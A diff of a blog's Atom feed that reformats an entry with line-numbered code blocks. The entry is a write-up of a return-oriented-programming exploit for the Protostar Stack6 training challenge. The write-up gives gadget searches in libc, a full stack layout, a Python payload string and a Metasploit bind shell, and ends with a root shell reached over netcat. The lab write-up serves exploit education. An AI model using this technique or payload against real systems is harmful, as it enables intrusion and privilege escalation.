@@ -1,8 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Nildram</title><link href="http://nildram.io/" rel="alternate"></link><link href="http://nildram.io/feeds/all.atom.xml" rel="self"></link><id>http://nildram.io/</id><updated>2015-03-06T10:20:00+01:00</updated><entry><title>Protostar Stack6 - ROP Solution</title><link href="http://nildram.io/protostar-stack6-rop-solution.html" rel="alternate"></link><updated>2015-03-06T10:20:00+01:00</updated><author><name>Nildram</name></author><id>tag:nildram.io,2015-03-06:protostar-stack6-rop-solution.html</id><summary type="html">&lt;p&gt;I've recently been revisiting the &lt;a href="https://exploit-exercises.com/protostar/"&gt;Protostar&lt;/a&gt; challenges from &lt;a href="https://exploit-exercises.com/"&gt;Exploit Exercises&lt;/a&gt;. Having prevously only completed the &lt;a href="https://exploit-exercises.com/protostar/stack6/"&gt;Stack6&lt;/a&gt; challenge using the duplicate payload and &lt;a href="http://goo.gl/Tg1MN9"&gt;return-to-libc&lt;/a&gt; methods suggested in the description, I thought I would run through a ROP solution and write up the steps as I go.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Nildram</title><link href="http://nildram.io/" rel="alternate"></link><link href="http://nildram.io/feeds/all.atom.xml" rel="self"></link><id>http://nildram.io/</id><updated>2015-03-06T10:20:00+01:00</updated><entry><title>Protostar Stack6 - ROP Solution</title><link href="http://nildram.io/protostar-stack6-rop-solution.html" rel="alternate"></link><updated>2015-03-06T10:20:00+01:00</updated><author><name>Nildram</name></author><id>tag:nildram.io,2015-03-06:protostar-stack6-rop-solution.html</id><summary type="html">&lt;p&gt;I've recently been revisiting the &lt;a href="https://exploit-exercises.com/protostar/"&gt;Protostar&lt;/a&gt; challenges from &lt;a href="https://exploit-exercises.com/"&gt;Exploit Exercises&lt;/a&gt;. Having previously only completed the &lt;a href="https://exploit-exercises.com/protostar/stack6/"&gt;Stack6&lt;/a&gt; challenge using the duplicate payload and &lt;a href="http://goo.gl/Tg1MN9"&gt;return-to-libc&lt;/a&gt; methods suggested in the description, I thought I would run through a ROP solution and write up the steps as I go.&lt;/p&gt;
 &lt;p&gt;I'll skip any introduction to ROP for now as there's plenty of &lt;a href="https://goo.gl/trusVL"&gt;other reading material&lt;/a&gt; already available.&lt;/p&gt;
 &lt;p&gt;The source code for the challenge is as follows:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
 &lt;span class="cp"&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
 &lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
 &lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
@@ -31,45 +58,55 @@
   &lt;span class="n"&gt;getpath&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;The basic idea is pretty straight forward; exploit the program to get arbitrary code execution. However, we can see that there are some restrictions on the return address that can be used.&lt;/p&gt;
 &lt;p&gt;As suggested in the description, there are multiple ways around this restriction, but we will just look at ROP.&lt;/p&gt;
 &lt;h2&gt;Controlling EIP&lt;/h2&gt;
 &lt;p&gt;Before we do anything else, let's start off by gaining control over EIP. We'll use Metasploit's &lt;code&gt;pattern_create&lt;/code&gt; and &lt;code&gt;pattern_offset&lt;/code&gt; tools to help us figure this one out.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 100 &amp;gt; inputroot@kali:~# gdb -q ./stack6
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 100 &amp;gt; input
+root@kali:~# gdb -q ./stack6
 Reading symbols from /root/stack6...done.
 gdb$ r &amp;lt; input
 input path please: got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
 Program received signal SIGSEGV, Segmentation fault.
---------------------------------------------------------------------------[regs]
-  EAX: 0x0000006E  EBX: 0xF7FBBFF4  ECX: 0xFFFFD408  EDX: 0xF7FBD360  o d I t S z A P c 
-  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x63413563  ESP: 0xFFFFD490  EIP: 0x37634136
-  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
-Cannot access memory at address 0x37634136
 0x37634136 in ?? ()
 gdb$ q
 root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37634136
 [*] Exact match at offset 80
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;Now we know that we need a payload with 80 bytes before we overwrite the return address of the &lt;code&gt;getpath()&lt;/code&gt; function with the next 4 bytes.&lt;/p&gt;
 &lt;h2&gt;Plan&lt;/h2&gt;
 &lt;p&gt;Now let's do some planning. Our goal will be to use a ROP chain to execute a TCP bind shell. We will use Metasploit to generate our bind shell and copy it over to the target as &lt;code&gt;/tmp/pwn&lt;/code&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;root@kali:~# msfpayload linux/x86/shell_bind_tcp X &amp;gt; linux-bind-shell-tcp
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4
+5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;root@kali:~# msfpayload linux/x86/shell_bind_tcp X &amp;gt; linux-bind-shell-tcp
 Created by msfpayload (http://www.metasploit.com).
 Payload: linux/x86/shell_bind_tcp
  Length: 78
 Options: {}
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;We will cause the target program to execute the bind shell with the following command:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;execv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/pwn&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;execv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/pwn&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;Let's break this down into steps:&lt;/p&gt;
 &lt;ol&gt;
@@ -85,10 +122,11 @@ Options: {}
 &lt;h3&gt;Getting our arguments into memory&lt;/h3&gt;
 &lt;p&gt;First we need to get the arguments to the &lt;code&gt;execve&lt;/code&gt; call into memory. The first argument will point to the string &lt;code&gt;"/bin/pwn"&lt;/code&gt;. We can just use a &lt;code&gt;NULL&lt;/code&gt; for the second and third parameters.&lt;/p&gt;
 &lt;p&gt;We could just pass the parameters in on the stack as arguments to the program, but the address of the arguments would be liable to change even without ASLR. Intead, we will pass them in as part of our buffer and arrange them in memory ourselves. We will use the &lt;code&gt;.data&lt;/code&gt; section to store these parameters:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ objdump -D /opt/protostar/bin/stack6 | grep __data
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ objdump -D /opt/protostar/bin/stack6 | grep __data
 08049710 &amp;lt;__data_start&amp;gt;:
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;Now we need some ROP gadgets. There's a tool for those, or rather a number of tools for those.&lt;/p&gt;
 &lt;p&gt;I'm going to go ahead and use &lt;code&gt;rp&lt;/code&gt; from &lt;a href="https://github.com/0vercl0k/rp"&gt;here&lt;/a&gt; because I can use a precompiled binary to avoid any dependency issues and because I'm a C++ fan.&lt;/p&gt;
@@ -100,7 +138,18 @@ Options: {}
 &lt;li&gt;Repeat steps 1 and 2 for successive 4 byte chunks, updating the address &lt;code&gt;[r2]&lt;/code&gt; each time. We can also add a &lt;code&gt;NULL&lt;/code&gt; on the end to terminate the string and provide the &lt;code&gt;NULL&lt;/code&gt; for arguments two and three of the call to &lt;code&gt;execve&lt;/code&gt;.&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Let's look for these gadgets. There's not alot to go on in the &lt;code&gt;stack6&lt;/code&gt; binary itself, so we look in &lt;code&gt;libc&lt;/code&gt; as this is also linked in. We'll start with the &lt;code&gt;mov&lt;/code&gt;, so we an identify which register we need to pop into, then the two &lt;code&gt;pop&lt;/code&gt; gadgets.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &amp;quot; mov dword \[ecx\]&amp;quot;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &amp;quot; mov dword \[ecx\]&amp;quot;
 ...
 0x00074997: mov dword [ecx], edx ; ret  ;  (1 found)
 ...
@@ -113,10 +162,38 @@ user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &a
 0x0013519d: pop ecx ; ret  ;  (1 found)
 ...
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;We can get the absolute address of this by adding it to the base address of &lt;code&gt;libc&lt;/code&gt; which we can get from &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/maps&lt;/code&gt; as shown below.  &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ gdb -q /opt/protostar/bin/stack6
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ gdb -q /opt/protostar/bin/stack6
 Reading symbols from /opt/protostar/bin/stack6...done.
 gdb$ b main
 Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
@@ -146,10 +223,37 @@ b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
 b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
 bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;We need to setup our stack as follows using the &lt;code&gt;libc&lt;/code&gt; base of &lt;code&gt;0xb7e97000&lt;/code&gt;. &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&amp;lt;lower memory&amp;gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&amp;lt;lower memory&amp;gt;
 ...
 # Load the target address in .data
     0xb7fcc19d &amp;lt;- Return address (pop ecx; ret)
@@ -178,19 +282,30 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 ...
 &amp;lt;higher memory&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;h3&gt;Setting up the registers&lt;/h3&gt;
 &lt;p&gt;Next step it to place the arguments in the three registers &lt;code&gt;ebx&lt;/code&gt;, &lt;code&gt;ecx&lt;/code&gt; and &lt;code&gt;edx&lt;/code&gt;, so we need to find a &lt;code&gt;pop&lt;/code&gt; for each.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep &amp;quot; pop ebx&amp;quot; --color
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep &amp;quot; pop ebx&amp;quot; --color
 ...
 0x000d8a81: pop edx ; pop ecx ; pop ebx ; ret  ;  (1 found)
 ...
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;Here we've found all three in a single gadget. Awesome! Let's add the following to our stack layout.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&amp;lt;lower memory&amp;gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4
+5
+6
+7
+8
+9&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&amp;lt;lower memory&amp;gt;
 ...
 # Load registers
     0xb7f6fa81 &amp;lt;- Return address (pop edx; pop ecx; pop ebx; ret)
@@ -200,19 +315,56 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 ...
 &amp;lt;higher memory&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;h3&gt;Calling &lt;code&gt;execve&lt;/code&gt;&lt;/h3&gt;
 &lt;p&gt;We need two more gadgets to load the system call number into eax and to envoke it. Luckily for us, &lt;code&gt;libc&lt;/code&gt; contains a gadget that serves both purposes:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &amp;quot;0x0000000B&amp;quot; ; int 0x80&amp;quot;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &amp;quot;0x0000000B&amp;quot; ; int 0x80&amp;quot;
 ...
 0x00097193: mov eax, 0x0000000B ; int 0x80 ;  (1 found)
 ...
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;Our finished stack layout should look like this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&amp;lt;lower memory&amp;gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&amp;lt;lower memory&amp;gt;
 ...
 # Load the target address in .data
     0xb7fcc19d &amp;lt;- Return address (pop ecx; ret)
@@ -248,17 +400,22 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 ...
 &amp;lt;higher memory&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;This now gives us the following payload:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ python -c &amp;#39;print &amp;quot;A&amp;quot;*80 + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/tmp&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x14\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/pwn&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;\x00\x00\x00\x00&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x81\xfa\xf6\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x93\xe1\xf2\xb7&amp;quot;&amp;#39; &amp;gt; input
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ python -c &amp;#39;print &amp;quot;A&amp;quot;*80 + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/tmp&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x14\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/pwn&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;\x00\x00\x00\x00&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x81\xfa\xf6\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x93\xe1\xf2\xb7&amp;quot;&amp;#39; &amp;gt; input
 user@protostar:~$ cat input | /opt/protostar/bin/stack6
 input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA������/tmp��������/pwn�������
 &lt;/pre&gt;&lt;/div&gt;
-
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;And from another shell:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;$ nc 192.168.94.133 4444
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;$ nc 192.168.94.133 4444
 whoami
 root
-&lt;/pre&gt;&lt;/div&gt;</summary><category term="Exploits"></category><category term="ROP"></category></entry></feed>
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</summary><category term="Exploits"></category><category term="ROP"></category></entry></feed>
